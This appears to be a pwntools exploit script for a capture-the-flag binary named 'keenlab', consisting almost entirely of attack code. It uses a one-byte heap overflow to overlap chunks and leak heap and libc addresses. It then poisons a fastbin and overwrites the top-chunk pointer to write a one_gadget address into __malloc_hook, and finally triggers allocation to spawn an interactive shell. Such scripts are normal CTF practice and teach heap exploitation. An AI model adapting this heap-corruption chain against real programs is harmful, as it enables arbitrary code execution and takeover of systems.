from pwn import *


r = process("./keenlab")

#pause()



def alloc(size,rec=True):
	if rec:
        	r.sendline("1")
        	r.recvuntil(":")
        	r.sendline(str(size))
        	r.recvuntil("Command:")
	else:
	 	r.sendline("1")
                r.recvuntil(":")
                r.sendline(str(size))


def update(idx,size,content):
        r.sendline("2")
        r.recvuntil(":")
        r.sendline(str(idx))
        r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(content)
        r.recvuntil("Command:")

def dele(idx):
        r.sendline("3")
        r.recvuntil(":")
        r.sendline(str(idx))
        r.recvuntil("Command:")

def show(idx):
        r.sendline("4")
        r.recvuntil(":")
        r.sendline(str(idx))



#heap leak

alloc(0x28) #0
alloc(0x28) #1
alloc(0x28) #2
alloc(0x28) #3


update(0,0x29,"A"*0x28+"\x61")
dele(1)
alloc(88)

fakechunk = p64(0)*5
fakechunk += p64(0x31)

update(1,len(fakechunk),fakechunk) #construct chunk 2 to prevent crash when freen'it

dele(3)
dele(2) #free 2 chunks to get fd /heap

show(1)
r.recvuntil("Chunk[1]: ");r.recvuntil(p64(0x31))
heap_leak = u64(r.recvline()[:8])
print "HEAP LEAK @",hex(heap_leak)

	#libc leak
def errr():
	alloc(0x48) #2
	alloc(0x48) #3
	alloc(0x48) #4
	alloc(0x48) #5
	update(2,0x49,"B"*0x48+"\xa1")
	dele(3) #size changed to 0xa0 freen'it lead to main_arena fd-bk

	alloc(0x48) #3

	show(4)
	r.recvuntil("Chunk[4]: ")
	libc_leak = u64(r.recvline()[:8])
	__malloc_hook = libc_leak - 0x68
	target_to_top = __malloc_hook + 0x1d

	print "LIBC LEAK @",hex(libc_leak)
	print "__MALLOC_HOOK @",hex(__malloc_hook)
	print "TARGET TO O/W TOP ",hex(target_to_top)

	alloc(0x48) #6  an overlaped chunk 6->4

	dele(5)
	dele(4)

	addr = p64(target_to_top)
	update(6,len(addr),addr)

	alloc(0x48) #4
	alloc(0x48) #5 TARGET

	top_overw = __malloc_hook -0x10

	pld = "RRRRRRRR"*7+"RRR"
	pld += p64(top_overw)

	update(5,len(pld),pld)

	alloc(20) #7

	base = __malloc_hook -0x3c4b10
	print "BASE @",hex(base)

	oneshot = p64(base + 0x4526a)

	update(7,len(oneshot),oneshot)

	alloc(1,rec=False)

	r.interactive()
try:
	errr()

except:
	log.warning("Run it Again Boi!")
